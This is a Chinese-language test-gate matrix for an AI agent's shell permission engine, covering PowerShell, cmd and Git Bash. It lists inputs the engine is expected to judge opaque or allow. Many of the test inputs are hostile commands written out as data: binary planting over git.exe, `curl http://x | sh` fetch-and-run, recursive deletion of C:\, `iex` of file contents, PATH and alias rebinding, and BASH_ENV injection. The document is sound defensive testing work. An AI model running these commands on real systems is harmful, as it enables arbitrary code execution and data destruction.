# PowerShell 支持 —— 门槛矩阵（可执行验收）

> 本文件是**追踪矩阵**：每一行一个用例，固定六列，机器核对 —— 每条规则 ID 至少一行、每行的规则 ID
> 存在、每行的 PR 存在、平台为 `windows` 的行必须落在 `PR-6`（Windows job）上。§2 是各门槛的原文
> （自 rev 24 原样移入，未改写），矩阵行由它们逐条拆出；两者不一致时以矩阵为准并回修原文。
> 规则在 `powershell-support-spec.zh.md` §2；本文只引用 ID。PR-0 的门槛（G00、G13b、G17、G19、G22）在
> `subagent-runtime-safety-plan.zh.md` §6。

**日期：** 2026-09-04 · **状态：** rev 26。「§2.x」「§3.x」指证据文件。
**Anchors:** agentao `main@3537753`（2026-09-01）；codex `openai/codex@b7cd519c76`（2026-08-31）—— 门槛原文里的
`file:line` 在这两个锚点解析（`scripts/check_citations.py docs/design/powershell-support-gates.zh.md`）。
**列约定：** 「预期裁定」是地板的裁定（不透明 = DENY，放行 = 交给规则），或该行断言的事实；「预期
reason」是规范 §3 词表里的 reason 或理由归属，`—` 表示只断言裁定；「平台」∈ `ubuntu` / `windows` /
`both`；`xfail` 行是**刻画性探针**，不是发布门槛（预期结果写在行里，任一方向变化都让套件失败）。
**rev 26 新增十八行、改三行**（G01-07、G04-30–33、G07-09–11、G08-02、G10-02、G11-04、G18-07、G21-13–14、G23-06–08、G24-10、G25-04；改 G18-02、G23-02、G25-01），全部对应完整安全评审的发现，见评审记录 rev 26 行。**rev 25 新增的六行：** G14-02（TOOL-02 此前没有门槛）、G05-02（EFF-06 此前没有门槛 —— 机检第一次跑就抓到）、
G24-09（rev 24 的 D2 承诺「门槛 24 对 fake executor 逐字段断言」而门槛原文没有写进去）、G04-29（从 G04-13 拆出：
`. ./evil.ps1` 与 `& ./evil.ps1` 的可达理由是第 5 步，不是 `executes_input`）、G07-08（WRAP-07 前缀运行者）与
G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原文。

## 1. 矩阵

| Gate | 规则 | 输入 / 夹具 | 预期裁定 | 预期 reason | 平台 / PR |
|---|---|---|---|---|---|
| G01-01 | TOOL-01、TOOL-04 | PR-1 落地后的测试套件 | `ShellExecutor` 的 fake 是唯一被迫的测试改动；`PermissionEngine(` 150 处不动 | — | ubuntu / PR-1 |
| G01-02 | SPEC-01 | 自定义 executor 报 `UNKNOWN`；body 不命中任何 POSIX 模式 | DENY | `hardline:unknown-dialect-opaque` | ubuntu / PR-1 |
| G01-03 | SPEC-01 | executor 报枚举之外的取值 | DENY | `hardline:unknown-dialect-opaque` | ubuntu / PR-1 |
| G01-04 | SPEC-02 | 每个合法的「方言 × rung」配对 | spec 构造成功 | — | ubuntu / PR-1 |
| G01-05 | SPEC-02 | `POWERSHELL × system_posix`；不认识的 rung | spec 构造失败并点名配对 | — | ubuntu / PR-1 |
| G01-06 | SPEC-02 | 非法配对漏到地板；body 不命中任何 POSIX 模式 | DENY | `hardline:unknown-rung-opaque` | ubuntu / PR-1 |
| G01-07 | SPEC-07 | 对已构造的 `ShellSpec` 的任何字段赋值；`add_tool(replace=True)` 换入新 provider | 赋值抛错；换入后工具实例持有**新对象**，旧引用不变 | — | ubuntu / PR-1 |
| G02-01 | IMG-06 | 每个方言的每一条地板测试 | 在 ubuntu 上运行，解析器来自 `dev` 组，oracle 为桩 | — | ubuntu / PR-2 |
| G03-01 | CMD-01、LOWER-01 | §3.5 的 18 类 | 每类有 PowerShell 翻译与 CMD 行，或明写的一行 | — | ubuntu / PR-2 |
| G03-02 | LOWER-02 | 接受表里的每一个 kind | 由钉住的解析器对某个输入产出；改名的语法升级挂在这里 | — | ubuntu / PR-2 |
| G04-01 | IMG-02、IMG-04 | `.\innocent.exe` 作为脚本里唯一那条命令 | 不透明 | 映像半：工作树不是可信根 | ubuntu / PR-4 |
| G04-02 | IMG-02 | 被拷进工作树的 `git.exe` 用该路径调用 | 不透明 | 映像半（有名字没映像） | ubuntu / PR-4 |
| G04-03 | IMG-02 | 未分类的程序以绝对路径从可信目录调用 | 不透明 | 名字半（有映像没名字） | ubuntu / PR-4 |
| G04-04 | IMG-01、ENV-01 | 植入在机器 PATH 上用户可写目录里的 `git.exe` | 不透明；该目录不出现在子进程 `PATH` | 映像半 | ubuntu / PR-4 |
| G04-05 | IMG-02 | 主体写不了的根下、可信表有条目的 `git.exe`（oracle 桩） | 放行 | — | ubuntu / PR-4 |
| G04-06 | IMG-03 | allowlist 里的绝对路径，所在目录用户可写，哈希与签名都对 | 不透明 | 位置，不是哈希 | ubuntu / PR-4 |
| G04-07 | IMG-03 | `Copy-Item .\evil.exe <allowlist 里的路径>; <那个词>` | 不透明 | 位置，不是哈希 | ubuntu / PR-4 |
| G04-08 | IMG-03 | 另一个进程在地板算哈希与子进程打开文件之间替换该路径 | 不透明 | 位置，不是哈希 | ubuntu / PR-4 |
| G04-09 | EFF-07 | EFF-07 门槛清单里每个 PowerShell 修改形式，后跟一条命令 | 不透明 | `rebinds_after` | ubuntu / PR-2 |
| G04-10 | EFF-05 | `Copy-Item Env:\A Env:\PATH; git`；`Rename-Item Env:\A PATH; git` | 不透明 | provider 驱动器规则 | ubuntu / PR-2 |
| G04-11 | EFF-04 | 未识别的 cmdlet 后跟一条命令 | 不透明 | 解析不到条目 | ubuntu / PR-2 |
| G04-12 | EFF-01 | `Get-Date; git status` | 放行 | — | ubuntu / PR-2 |
| G04-13 | EFF-02 | `Import-Module .\evil.psm1`：作为唯一命令、作为最后一条、后跟 `git status` | 不透明 | `executes_input`（自身，不是后继） | ubuntu / PR-2 |
| G04-14 | EFF-02 | `Set-Content safe.ps1 evil; . .\safe.ps1`；被并发改写的 `safe.ps1` | 不透明 | `executes_input` 文件目标 | ubuntu / PR-2 |
| G04-15 | EFF-07 | bash `. ./evil.sh`、`source ./evil.sh` 单独出现 | 不透明 | `executes_input` | ubuntu / PR-2 |
| G04-16 | EFF-03 | `source ./safe.sh; git status`，`safe.sh` 只有一行 `hash -p ./evil git` | 不透明 | 传播上来的退出态，不是 `source` 本身 | ubuntu / PR-2 |
| G04-17 | EFF-03 | `bash ./safe.sh; git status` | 不透明 | 未降级的子进程（另一个理由） | ubuntu / PR-2 |
| G04-18 | EFF-03 | 已降级且惰性的 `helper.sh` 后跟 `git status` | 放行 | — | ubuntu / PR-2 |
| G04-19 | LOWER-04 | codex `powershell_lowering.json` 的 44 条 `null` 行 | 不透明，逐条断言失败在哪一步 | 各自的步骤 | ubuntu / PR-2 |
| G04-20 | LOWER-03 | `git status --short#; Remove-Item victim` | 不透明 | 第 8 步，源码保真 | ubuntu / PR-2 |
| G04-21 | LOWER-01 | `Remove-Item test –Force` | 不透明 | 第 1 步，Unicode 别名 | ubuntu / PR-2 |
| G04-22 | LOWER-01 | `git log --% HEAD` | 不透明 | 停止解析记号 | ubuntu / PR-2 |
| G04-23 | LOWER-01 | `using module ./x.psm1` | 不透明 | 第 9 步 | ubuntu / PR-2 |
| G04-24 | LOWER-01 | 一个 attached parameter value；一个十六进制或前导零的数字打头裸词 | 不透明 | 第 7 步，argv 降级 | ubuntu / PR-2 |
| G04-25 | LOWER-02 | `$Function:git = { & C:\evil.exe }; git`；`[Environment]::SetEnvironmentVariable('PATH','C:\x'); git` | 不透明 | 第 5 步，节点 kind | ubuntu / PR-2 |
| G04-26 | LOWER-01 | `#Requires -Modules Evil` 后跟可信裸词，含前导空白与大小写混写的版本 | 不透明 | 第 4 步 | ubuntu / PR-2 |
| G04-27 | LOWER-01 | 普通 `# comment` 后跟同一个词 | 放行 | — | ubuntu / PR-2 |
| G04-28 | LOWER-04 | 24 条非 `null` 行，含 `a \| b`、`a; b` 与行尾注释 | 整个降级出的 argv 与 `expected` 相等 | — | ubuntu / PR-2 |
| G04-29 | LOWER-02、WRAP-04 | `. ./evil.ps1`、`& ./evil.ps1`：作为唯一命令、作为最后一条、后跟 `git status` | 不透明 | 第 5 步，节点 kind（`command_invokation_operator` / `command_name_expr` 不在接受清单）—— **不是** `executes_input`，那条到不了 | ubuntu / PR-2 |
| G04-30 | EFF-08 | `git -c core.pager=C:\evil.exe log`、`git --exec-path=C:\x status`、`python -c 'import os'`、`node -e 'x'`、`explorer C:\x.lnk` | 不透明 | `executes_input`，命中各条目登记的 `execution_triggers` | ubuntu / PR-2 |
| G04-31 | EFF-02 | `Get-Content x \| iex`；`iex (Get-Content x)` | 不透明 | 前者 `executes_input`（管道供给、非字面目标）；后者第 5 步（括号表达式 kind） | ubuntu / PR-2 |
| G04-32 | EFF-02、WRAP-04 | `iex 'git status'`；`iex 'Set-Alias git C:\evil.exe'; git status` | 前者放行（4a 重新进入）；后者不透明 | 后者：重新进入后的 `rebinds_after` | ubuntu / PR-2 |
| G04-33 | EFF-01、EFF-07 | `Set-Alias git C:\evil.exe; git status`、`New-Alias`、`Set-Variable` 各后跟 `git status` | 不透明 | `rebinds_after` —— 条目自己的标志，不是 EFF-05（这些不点名 provider 驱动器） | ubuntu / PR-2 |
| G05-01 | WRAP-02、TOK-01 | 每个词干的启动参数用例及越界用例 | 按 WRAP-02 的表：重新进入 / 解码后重新进入 / 不透明 / 消费 | — | ubuntu / PR-2 |
| G05-02 | TOK-02、EFF-06 | `Remove-Item $flags C:\`；`Get-ChildItem $dir` —— 命令词在表内、谓词读取位置是 `Dynamic` | 不透明 | 谓词读取位置 `Dynamic` | ubuntu / PR-2 |
| G06-01 | CMD-01、TOK-02、WRAP-03 | CMD 对抗性用例：控制流、分组、每种变量形式 | 不透明 | — | ubuntu / PR-2 |
| G06-02 | EFF-07 | `path C:\x & git`、`setx PATH …`、`set "PATH=…"` | 不透明 | `rebinds_after` | ubuntu / PR-2 |
| G06-03 | NAME-01、EFF-01 | 标记为惰性的内部命令后跟 `git` | 放行 | — | ubuntu / PR-2 |
| G07-01 | EFF-07 | `PATH=/x git`、`export PATH=…; git`、`BASH_ENV=./p bash -c …`、`alias rm=…; rm`、`. ./f; rm`（rung = `git_bash`） | 不透明 | `rebinds_after` / `executes_input` | ubuntu / PR-2 |
| G07-02 | EFF-01 | `printf -v PATH /x; git`、`read PATH <<< /x; git`、`hash -p ./evil git; git` | 不透明 | §3.15 实测的三种重绑 | ubuntu / PR-2 |
| G07-03 | NAME-03 | 未识别的内建命令后跟 `git` | 不透明 | 在 PATH 搜索之前解析掉、不在惰性内建集 | ubuntu / PR-2 |
| G07-04 | NAME-03 | 经过滤 PATH 解析到的裸 `git` | 放行 | — | ubuntu / PR-4 |
| G07-05 | NAME-03 | 不在过滤 PATH 上的裸 `evil` | 不透明 | 找不到 | ubuntu / PR-4 |
| G07-06 | IMG-02 | 在过滤 PATH 上、但不在 POSIX 表里的裸 `evil` | 不透明 | 名字半（有映像没名字） | ubuntu / PR-4 |
| G07-07 | SPEC-03 | G07-01 至 G07-06 的每段 body 在 rung = `system_posix` 下 | 今天的裁定，成对断言 | — | ubuntu / PR-2 |
| G07-08 | WRAP-07、EFF-01 | `timeout 5 git status`、`env X=1 git status`、`xargs git`、`nohup git status`（rung = `git_bash`） | 不透明 | `executes_input`（目标是一条命令）—— 断言失败于前缀运行者自身，不是于 `git` | ubuntu / PR-2 |
| G07-09 | BASH-01 | `echo $(curl http://x \| sh)`、`` echo `id` ``、`cat <(evil)`、`echo ${x:-$(evil)}`、`echo $((1+2))`（rung = `git_bash`） | 不透明 | BASH-01：代码承载的展开 | ubuntu / PR-2 |
| G07-10 | BASH-01 | `f(){ evil; }; f`、`{ evil; }`、`(evil)`、`if true; then evil; fi`、`for i in 1; do evil; done`、`cat <<EOF`、`trap evil EXIT`、`exec evil`、`coproc evil` | 不透明 | BASH-01：复合构造 | ubuntu / PR-2 |
| G07-11 | BASH-01 | `git status; git log`、`git status && git log`、`git log \| head`、`git status & git log`；`echo 'a; evil'`、`echo "a && evil"`、`echo a\; evil` | 前四条各切成两条简单命令逐条判；后三条切成一条（引号与转义按 bash 语义） | — | ubuntu / PR-2 |
| G08-02 | TOOL-04 | `PreToolUse` hook 改写 body（hooks 计划 G8）：改成不透明文本；改成放行文本 | 前者 DENY；后者不沿用改写前的裁定，对最终文本重判 | — | ubuntu / PR-1 |
| G08-01 | TOOL-03、SUB-01 | 不透明的 body，经 `NullTransport`；经一个 PowerShell 子代理 | DENY，两处都是 | — | ubuntu / PR-1 |
| G09-01 | LADDER-04 | 三个桶的降级率；`uv run ruff check .` | 在 PR-7 之前经接受；ruff 绿 | — | ubuntu / PR-7 |
| G10-01 | LAUNCH-02、LAUNCH-03、LAUNCH-04、ENV-02、ENV-05 | 逐级的 Windows 矩阵（规范 §5 的表，含每级的 `PATH`、`PATHEXT` 与 PowerShell 级的 `PSModulePath` 钉值） | 每一级按它那一行启动 | — | windows / PR-6 |
| G10-02 | LADDER-05、SPEC-03 | 翻转前的 Windows 默认执行器；G04–G07 的每段 body | 报 `CMD × legacy_cmd`，走 `%COMSPEC% /c`，每段 body 的裁定与 `main@3537753` 相同 | — | windows / PR-6 |
| G11-01 | LADDER-01、LADDER-02 | `allow_git_bash` 关着 | 阶梯止于 `cmd` | — | ubuntu / PR-4 |
| G11-02 | LADDER-02 | 开着且 Git Bash 在场 | 选 Git Bash，排在 `cmd` 之前 | — | ubuntu / PR-4 |
| G11-03 | LADDER-02 | 开着且 Git Bash 不在场 | 回退 `cmd` | — | ubuntu / PR-4 |
| G11-04 | LADDER-05 | PR-7 之后一个报 `legacy_cmd` 的 spec | 构造失败并点名；漏到地板 ⇒ DENY | `hardline:unknown-rung-opaque` | ubuntu / PR-7 |
| G12-01 | CFG-01 | `settings.json` / 项目文件里的 `shell` 块 | 被忽略 | — | ubuntu / PR-3 |
| G13-01 | CFG-03 | embedding factory、ACP `session_new`、ACP `session_load` | 同一份 `PermissionConfig` 快照抵达每个 root | — | ubuntu / PR-3 |
| G14-01 | CFG-02 | 缺 provider；两个来源各出半份 spec | 被拒 | — | ubuntu / PR-3 |
| G14-02 | TOOL-02 | 带 `args.command` 而无 `dialect` 标注的规则，rung 为 `pwsh` | spec 构造失败，逐条点名并列出四个标签；POSIX 与 cmd 下照旧生效 | — | ubuntu / PR-3 |
| G15-01 | IMG-04 | 工作树里的二进制 | 不解析 | — | ubuntu / PR-4 |
| G16-01 | CFG-02 | 构造参数与用户级 `shell` 块同时给出 | 按来源整体优先，低来源被忽略 | — | ubuntu / PR-3 |
| G18-01 | ENV-04 | cmd rung 的子进程 | `NoDefaultCurrentDirectoryInExePath=1` | — | windows / PR-6 |
| G18-02 | LAUNCH-02、LAUNCH-03 | 哨兵 body，含非 ASCII、`%`、`"`、换行与 `^` | 子进程收到的 body 与地板扫过的逐字节一致；观测手段写明（若靠 `$MyInvocation.Line` 自报，量的是引号不是身份） | — | windows / PR-6 |
| G18-03 | ENV-01、ENV-02 | 子进程 `PATH` 与 `PATHEXT`；机器 PATH 上一个用户可写的目录 | 如钉；该目录不在子进程 `PATH` | — | windows / PR-6 |
| G18-04 | ENV-02 | 同目录 `git.cmd` 与 `git.exe` | 跑 `.exe` | — | windows / PR-6 |
| G18-05 | LAUNCH-03 | 含空格的 cmd 路径 | 按该解释器调用 | — | windows / PR-6 |
| G18-06 | ENV-03 | `pwsh` 与 `cmd` rung 的子进程，父环境导出 `BASH_FUNC_git%%` 并设 `BASH_ENV`；一条可信 `git` 经 `!` 别名再起 `sh.exe` | 那个 `sh` 的环境里没有任何 `BASH_FUNC_*`、`BASH_ENV`、`ENV` —— 清除不限于 bash rung | — | windows / PR-6 |
| G18-07 | LAUNCH-08 | 组装后超过 32767 WCHAR 的命令行 | 分析之前拒绝，不截断，不启动 | `hardline:<dialect>-opaque:launch-oversize` | windows / PR-6 |
| G20-01 | ENV-03 | 父环境 `BASH_ENV` 指向工作树文件 | 子进程只跑 body | — | windows / PR-6 |
| G20-02 | ENV-03、LAUNCH-04 | 父环境导出 `BASH_FUNC_git%%` | 裸 `git` 是 `/usr/bin/git`，不是那个函数 | — | windows / PR-6 |
| G20-03 | ENV-03 | 一条可信命令自己再跑 `/bin/sh -c` | 那个环境里没有任何 `BASH_FUNC_*` —— `-p` 单独给不了 | — | windows / PR-6 |
| G20-04 | LAUNCH-04 | `/c/Users` 形与 `C:\Users` 形的参数，`MSYS_NO_PATHCONV=1` | 原样抵达 body | — | windows / PR-6 |
| G20-05 | NAME-03 | 裸 `git` | 跑可信的 `git.exe` | — | windows / PR-6 |
| G20-06 | IMG-04 | 工作树里的 `evil.sh` | 不被裸 `evil` 执行 | — | windows / PR-6 |
| G20-07 | NAME-03 | 可信目录里无扩展名 `git` 脚本与 `git.exe` 并存 | 实测裸 `git` 跑哪一个，答案写进 NAME-03 | — | windows / PR-6 |
| G20-08 | LADDER-04 | G20 任一行红 | PR-7 关着 Git Bash 那一级发布 | — | ubuntu / PR-7 |
| G21-01 | IMG-07、NAME-02 | 同一段脚本在 `powershell.exe` 与 `pwsh` 下 | 各用自己实测的表；一个 edition 里是别名、另一个里不存在的裸词两边判定不同 | — | windows / PR-6 |
| G21-02 | IMG-07 | 记录身份两张表都不匹配的解释器 | 不透明 | 身份不在实测表 | windows / PR-6 |
| G21-03 | ENV-05 | CurrentUser 模块目录（工作树之外）里一个导出 `git` 函数的模块 | 子进程报告偏好为 `None`，裸 `git` 解析到可信 `git.exe` | — | windows / PR-6 |
| G21-04 | LAUNCH-07 | 第一条语句带可观察副作用的 body | 前奏之后仍产生同样的副作用 | — | windows / PR-6 |
| G21-05 | IMG-08 | 任一作用域的 `powershell.config.json` 选了非默认会话配置，其启动脚本写哨兵文件 | 该级不启动解释器就拒绝；哨兵文件不存在 | — | windows / PR-6 |
| G21-06 | SPEC-06、IMG-09、NAME-02 | 预检无法确立封闭环境 | 每个 PowerShell 裸词不透明 —— 断言的是降级，不是失败 | — | windows / PR-6 |
| G21-07 | LAUNCH-05 | 会话配置把自动加载偏好改回去 | body **零**副作用，启动以非零码退出 | — | windows / PR-6 |
| G21-08 | IMG-08 | 预检之后、启动之前改掉配置 | 守卫失败、非零退出，body 副作用一次都没发生 | — | windows / PR-6 |
| G21-09 | IMG-07 | 把解析路径底下的解释器换成记录字段不同的那一个 | 守卫身份校验失败、非零退出 | — | windows / PR-6 |
| G21-10 | IMG-08 | **探针 (a)**：预检之后装上的配置 | `xfail`：启动哨兵预期**存在**（脚本跑在前奏之前），body 的副作用不发生 | — | windows / PR-6 |
| G21-11 | IMG-07 | **探针 (b)**：记录字段与记录哈希全都对上的替换体 | `xfail`：预期**测不出来** | — | windows / PR-6 |
| G21-12 | LAUNCH-06 | `<C-check>` 表达式 | 记录是「找到了子进程内的写法」还是「三个来源都没发现配置」 | — | windows / PR-6 |
| G21-13 | ENV-02 | 可信目录里 `git.ps1` 与 `git.exe` 并存，`PATHEXT=.COM;.EXE` | 实测裸 `git` 解析到哪一个；答案写进 ENV-02 | — | windows / PR-6 |
| G21-14 | IMG-08 | `powershell.exe` 5.1 | 三来源读取只见 Group Policy；LAUNCH-06 的例外按构造成立，`<C>` 省略且该级不被拒 | — | windows / PR-6 |
| G23-01 | IMG-05 | 丢进「恰好在机器 PATH 上的用户可写目录」的 `pwsh.exe`，body 会写哨兵文件 | 永不自动选中；哨兵文件不存在（没被启动） | — | windows / PR-6 |
| G23-02 | IMG-05、IMG-01 | 同一个二进制经 `shell.path` 显式点名，仍在用户可写目录 | 拒绝，点名 IMG-01（(b) 免签名，不免位置）；把它放到主体写不了的目录、无签名、经 `shell.path` 点名 ⇒ 被选中 | — | windows / PR-6 |
| G23-03 | IMG-05 | 已知安装位置里没有签名的映像 | 拒 | — | windows / PR-6 |
| G23-04 | IMG-08 | launcher 所在目录不是 `$PSHOME`（shim、符号链接、拷贝） | AllUsers 配置从宿主侧解析出的安装根读；解析不出则拒绝该级 | — | windows / PR-6 |
| G23-05 | IMG-01、IMG-02 | 主体写不了的根下、可信表有条目的 `git.exe`，对子进程 token 做真实 ACL 检查，无签名、不在 allowlist | 放行 | — | windows / PR-6 |
| G23-06 | IMG-01、IMG-06 | 只读的 `D:\tools\vendor\bin\git.exe`，而 `D:\tools` 对主体可写（可重命名） | 不透明 | 映像半：可写的祖先 | windows / PR-6 |
| G23-07 | IMG-06 | 主体写不了的目录里一个指向用户目录的 junction / symlink / app execution alias；及其反向 | 不透明，两个方向都是 | 映像半：链上的 reparse 目标或别名所在目录可写 | windows / PR-6 |
| G23-08 | IMG-06、IMG-03 | `C:\PROGRA~1\Git\cmd\git.exe`、大小写变体、尾随点、`\\?\` 前缀；`git.exe:ads` | 前四种与规范拼法裁定相同，且 allowlist pin 生效；ADS 不透明 | — | windows / PR-6 |
| G24-01 | WRAP-01 | `pwsh -NoProfile -Command "git status"` | 不透明 | 嵌套解释器启动 | ubuntu / PR-2 |
| G24-02 | WRAP-01 | `pwsh -Command "Remove-Item -Recurse -Force C:\"` | 不透明 | 重新进入后的危险表命中（§3.6） | ubuntu / PR-2 |
| G24-03 | WRAP-01 | `cmd /c git status`；`bash -c 'git status'` | 不透明 | 嵌套解释器启动 | ubuntu / PR-2 |
| G24-04 | SPEC-04、SPEC-05 | `filesystem_is_local` 为假且执行器无 oracle；整个省掉该字段的 spec | 每一个需要映像的命令词不透明 | — | ubuntu / PR-4 |
| G24-05 | SPEC-04 | 同一段 body 在本机 spec 下 | 原来的裁定 | — | ubuntu / PR-4 |
| G24-06 | SPEC-05、IMG-06 | 提供了 oracle：在目标 PATH 上解析得到、在地板 PATH 上解析不到的裸词 | 放行 | — | ubuntu / PR-4 |
| G24-07 | SPEC-05、IMG-06 | 反过来：地板 PATH 上有、目标 PATH 上没有 | 不透明 | 映像半 | ubuntu / PR-4 |
| G24-08 | WRAP-05 | `Start-Job { … }`，本机与非本机 | 不透明，两边都是 | 另起进程 | ubuntu / PR-2 |
| G24-09 | LAUNCH-01 | 一个 fake executor | 逐字段断言启动请求：判别体（`argv` 或 `application_name` + `command_line`）、环境、`execution_subject`、`attested_images` —— 不只是「解析发生过」 | — | ubuntu / PR-1 |
| G24-10 | LAUNCH-01、SPEC-05 | 非本机执行器，目标 PATH 与地板 PATH 不同 | `env_delta` 按 oracle 答出的目标 PATH 条目算出，执行器施加到目标的基础环境；请求里没有地板机器的 PATH | — | ubuntu / PR-4 |
| G25-01 | IMG-01、LADDER-03 | agentao 以管理员或容器 `root` 运行；`Copy-Item .\evil.exe 'C:\Program Files\Git\cmd\git.exe'; git status` | 该级被拒绝；任何一步都不得走到「放行」 | 可信集为空 | windows / PR-6 |
| G25-02 | IMG-01 | 非特权时同一段 body | 放行；拷贝在 OS 层失败，跑起来的是可信的 `git` | — | windows / PR-6 |
| G25-03 | LADDER-03 | 每一级都被拒绝 | 每次 shell 调用返回 reason，工具仍注册着，不退回 `%COMSPEC% /c` | `hardline:no-trusted-rung-opaque` | ubuntu / PR-4 |
| G25-04 | IMG-01 | ubuntu：注入 oracle 桩、rung = `pwsh` 的 spec，每个候选根都答「能写」 | 该级被拒绝；阶梯走空 ⇒ LADDER-03 | `hardline:no-trusted-rung-opaque` | ubuntu / PR-4 |
| G26-01 | WRAP-05 | `Start-Process git` | 不透明 | ShellExecute 不是 NAME-02 的解析器 | ubuntu / PR-2 |
| G26-02 | WRAP-05 | `Start-Process -UseNewEnvironment git` | 不透明 | 环境：装回过滤前的用户 `PATH` | ubuntu / PR-2 |
| G26-03 | WRAP-05 | `Start-Process -Verb RunAs git` | 不透明 | 主体 | ubuntu / PR-2 |
| G26-04 | WRAP-05、WRAP-06 | `Invoke-Item .\x`；cmd `start x` | 不透明 | 文件关联 | ubuntu / PR-2 |
| G26-05 | WRAP-05 | `Invoke-Command -ComputerName a { git status }` | 不透明 | 另起进程 / 另一台机器 | ubuntu / PR-2 |
| G26-06 | WRAP-05 | `git status &` | 不透明，拒于 LOWER-01 第 5 或第 8 步，写明是哪一步 | 尾置作业运算符（节点 kind 未核实） | ubuntu / PR-2 |

## 2. 门槛原文（自 rev 24 原样移入）

原文里的「D2」「D4」「D5 5a」「规则 6」等指 rev 24 的决策节；它们现在对应的规则 ID 在矩阵的「规则」列。

### G01

PR-1：`ShellExecutor` 的 fake 是唯一被迫的测试改动；`PermissionEngine(` 不动。**并且没有标注的
方言有裁定：** 自定义 `ShellExecutor` 报 `UNKNOWN`、以及报枚举之外的取值，各自都产出
`hardline:unknown-dialect-opaque` ⇒ DENY，且发生在任何规则匹配之前 —— 断言用的是一段任何 POSIX
模式都不会命中的 body，于是「回退到 POSIX 扫描器」会挂在这道门槛上，而不是静悄悄地通过（D2）。
**`rung` 也照此办理：** 每个合法配对都能构造成功，`POWERSHELL × system_posix` 与一个不认识的 rung
都**在 spec 构造时失败**并点名那个配对，而带着它们之一漏到地板的 spec 返回
`hardline:unknown-rung-opaque` ⇒ DENY —— 同样用一段任何 POSIX 模式都不命中的 body 来断言，因为要
门住的实现错误正是「把未知那种情形路由到 `system_posix`」，而它的政策是关着的（D2）。

### G02

每个方言的每一条地板测试都**在 ubuntu 上**运行，解析器来自 `dev` 组。

### G03

§3.5 的 18 个类：PowerShell 翻译与 CMD 行或明写的一行。**并且节点表钉在语法上：** D5 第 5 步那张
表里的每一个 kind，都能由钉住的解析器对某个输入产出，于是重命名了某个 kind 的语法升级会挂在这道
门槛上，而不是悄悄把一个 `REFUSED` 的 kind 变成 `ACCEPTED`。

### G04

**封闭可运行集的两半（D5 5a、规则 6）：** `.\innocent.exe` 作为脚本里**唯一**那条命令判
**不透明** —— 工作树不是可信根，而地板既没分析它的映像也没分析它的效果；一个**被拷进工作树**的
`git.exe` 用该路径调用，判**不透明**，尽管它的 basename 在可信表里有条目（有名字没映像）；一个
**未分类**的程序以绝对路径从可信目录里调用，判**不透明**（有映像没名字）；一个植入在**机器 PATH
上的用户可写目录**里的 `git.exe` 判**不透明**，且该目录**不出现在子进程的 `PATH` 里** —— 这正是
「只要任何 PATH 条目都算可信根，它就两半皆过」的那一格，也是两个工作树反例都到不了的那一格
（D4）；而在一个主体写不了的根下、且在可信表里有条目的 `git.exe`，判**放行**。每一个判不
透明的用例都断言失败于它自己的那条理由 —— 否则它们都会因为错的理由而通过。**并且断言 allowlist 不
能单独成立（D5 5a）：** 一个 allowlist 里的绝对路径，若它所在目录用户可写，仅凭位置这一条就判
**不透明**，即便它的哈希与签名都对；同一条路径**在 body 内被替换** ——
`Copy-Item .\evil.exe <allowlist 里的路径>; <那个词>` —— 判**不透明**，而「另一个进程在地板算哈希
与子进程打开文件之间替换它」那一版同样判不透明，两者都断言失败于位置、而不是失败于哈希 —— 因为一
次碰巧命中的哈希核验会把正在被测的那条规则挡住。**正例跑在它能跑的地方：** 「有签名、在仅管理员可
写的根下、判放行」在 ubuntu 上是身份 oracle 的桩（门槛 2），在 Windows job 上是真的 ACL 加签名
（门槛 23）—— 一个在它自己那道门槛所运行的平台上根本造不出来的用例，不是门槛（D4）。然后是
PowerShell 对抗
性用例，外加规则 6 门槛清单里每个 PowerShell 形式后跟一条命令
（**不透明**）、`Copy-Item Env:\A Env:\PATH; git` 与 `Rename-Item Env:\A PATH; git`
（**不透明**，由 provider 驱动器规则判定，没有任何一行点过它们）、未识别的 cmdlet 后跟一条命令
（**不透明** —— 解析不到条目即非惰性），以及 `Get-Date; git status`（**放行** —— 惰性条目）。
**`executes_input` 单独测，后面什么都不跟：**
`Import-Module .\evil.psm1`、`. ./evil.ps1` 与 `& ./evil.ps1` 作为脚本里**唯一**那条命令，以及
各自再作为若干条里的**最后**一条 —— 全部**不透明**，而且现在**即便目标是地板本可以读到的字面路径
也依然不透明**，`Set-Content safe.ps1 evil; . .\safe.ps1` 与一个被并发改写的 `safe.ps1` 就是排除
任何字面路径例外的那两格；这三条后跟 `git status` 时同样不透明，理由
还是它们自己，不是那个后继。bash 上：`. ./evil.sh` 与 `source ./evil.sh` 单独出现。
**`rebinds_caller` 的传播：** 一个只有一行 `hash -p ./evil git` 的
`safe.sh` 被分析出「里面没有不透明的东西」，随后 `source ./safe.sh; git status` 判**不透明** ——
断言它失败于被传播上来的退出态，而不是失败于 `source` 本身；`bash ./safe.sh; git status` 因*另一
个*理由（一个未降级的子进程）不透明，而一个已降级且惰性的 `helper.sh` 后跟 `git status` 仍然
**放行**，于是传播不是一刀切的拒绝。**规则 0 拿 codex 的语料测，而不是我自己挑的例子：**
`powershell_lowering.json` 全部 68 例，其中 44 条 `null` 行在这里也必须不透明，且逐条断言它失败在
哪一步 —— 因错误的理由而不透明，算失败。逐条点名，因为它们落在不同步骤：
`git status --short#; Remove-Item victim`（第 8 步，源码保真）、`Remove-Item test –Force`（第 1
步，Unicode 别名）、`git log --% HEAD`（停止解析）、`using module ./x.psm1`（第 9 步）、一个
attached parameter value 与一个十六进制或前导零的数字打头裸词（**第 7 步**，argv 降级）、
`$Function:git = { & C:\evil.exe }; git` 与
`[Environment]::SetEnvironmentVariable('PATH','C:\x'); git`（第 5 步，节点 kind），以及
`#Requires -Modules Evil` 后跟一个可信裸词、连同它带前导空白与大小写混写的版本（第 4 步）—— 而一
条普通的 `# comment` 后跟同一个词仍然**放行**，于是第 4 步抓的是指令，不是注释。**另外那 24 条非
`null` 行也是门槛，方向相反，而且要按 codex 的比法比：** 不是「降级成功」，而是**整个降级出的
`argv` 与 fixture 的 `expected` 相等**，那正是它自己的测试所断言的
（`codex-rs/shell-command/src/command_safety/powershell_tree_sitter_tests.rs:22-24`）。
只要求「降级成功」，错的引号、错的转义或切错的参数边界都能过，然后把错的值交给那些判定危险的参数
谓词。`a | b`、`a; b` 与行尾注释也在这些行里。

### G05

每个词干的启动参数用例及越界用例。

### G06

CMD 对抗性用例，外加规则 6 门槛清单里每个 cmd 形式 —— `path C:\x & git`、
`setx PATH …`、`set "PATH=…"`（**不透明**）—— 以及标记为惰性的内部命令后跟 `git`（**放行**）。

### G07

